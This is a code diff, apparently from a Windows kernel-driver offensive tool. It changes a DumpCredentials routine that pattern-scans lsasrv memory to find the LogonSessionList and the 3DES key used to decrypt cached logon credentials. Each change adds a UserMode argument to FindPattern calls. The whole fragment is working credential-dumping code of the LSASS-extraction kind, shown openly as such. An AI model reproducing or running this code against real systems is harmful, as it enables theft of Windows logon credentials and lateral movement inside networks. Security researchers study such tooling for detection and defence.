@@ -654,12 +654,12 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 		// Finding LsaEnumerateLogonSession and LsaInitializeProtectedMemory to extract the LogonSessionList and the 3DES key.
 		PVOID lsaEnumerateLogonSessionLocation = FindPattern(const_cast<PUCHAR>(LogonSessionListLocation), 0xCC,
 			sizeof(LogonSessionListLocation), lsasrvMain,
-			LogonSessionListLocationDistance, NULL, 0);
+			LogonSessionListLocationDistance, 0, NULL, UserMode);
 
 		if (!lsaEnumerateLogonSessionLocation) {
 			lsaEnumerateLogonSessionLocation = FindPattern(const_cast<PUCHAR>(LogonSessionListLocation), 0xCC,
 				sizeof(LogonSessionListLocation), lsasrvMain,
-				LogonSessionListLocationDistance, NULL, 0, true);
+				LogonSessionListLocationDistance, 0, NULL, UserMode, true);
 
 			if (!lsaEnumerateLogonSessionLocation) {
 				status = STATUS_NOT_FOUND;
@@ -668,11 +668,11 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 		}
 
 		PVOID lsaInitializeProtectedMemory = FindPattern(const_cast<PUCHAR>(IvDesKeyLocation), 0xCC,
-			sizeof(IvDesKeyLocation), lsasrvMain, IvDesKeyLocationDistance, NULL, 0);
+			sizeof(IvDesKeyLocation), lsasrvMain, IvDesKeyLocationDistance, 0, NULL, UserMode);
 
 		if (!lsaInitializeProtectedMemory) {
 			lsaInitializeProtectedMemory = FindPattern(const_cast<PUCHAR>(IvDesKeyLocation), 0xCC,
-				sizeof(IvDesKeyLocation), lsasrvMain, IvDesKeyLocationDistance, NULL, 0, true);
+				sizeof(IvDesKeyLocation), lsasrvMain, IvDesKeyLocationDistance, 0, NULL, UserMode, true);
 
 			if (!lsaInitializeProtectedMemory) {
 				status = STATUS_NOT_FOUND;
@@ -682,7 +682,7 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 
 		PVOID lsaEnumerateLogonSessionStart = FindPattern(const_cast<PUCHAR>(FunctionStartSignature), 0xCC,
 			sizeof(FunctionStartSignature), lsaEnumerateLogonSessionLocation,
-			WLsaEnumerateLogonSessionLen, NULL, 0, true);
+			WLsaEnumerateLogonSessionLen, 0, NULL, UserMode, true);
 
 		if (!lsaEnumerateLogonSessionStart) {
 			status = STATUS_NOT_FOUND;
@@ -692,7 +692,7 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 		// Getting 3DES key
 		PULONG desKeyAddressOffset = static_cast<PULONG>(FindPattern(const_cast<PUCHAR>(DesKeySignature), 0xCC,
 			sizeof(DesKeySignature), lsaInitializeProtectedMemory, LsaInitializeProtectedMemoryLen,
-			DesKeyOffset, &foundIndex));
+			DesKeyOffset, &foundIndex, UserMode));
 
 		if (!desKeyAddressOffset) {
 			status = STATUS_NOT_FOUND;
@@ -726,7 +726,7 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 		// Getting LogonSessionList
 		PULONG logonSessionListAddressOffset = static_cast<PULONG>(FindPattern(const_cast<PUCHAR>(LogonSessionListSignature), 0xCC,
 			sizeof(LogonSessionListSignature), lsaEnumerateLogonSessionStart, WLsaEnumerateLogonSessionLen,
-			LogonSessionListOffset, &foundIndex));
+			LogonSessionListOffset, &foundIndex, UserMode));
 
 		if (!logonSessionListAddressOffset) {
 			status = STATUS_NOT_FOUND;
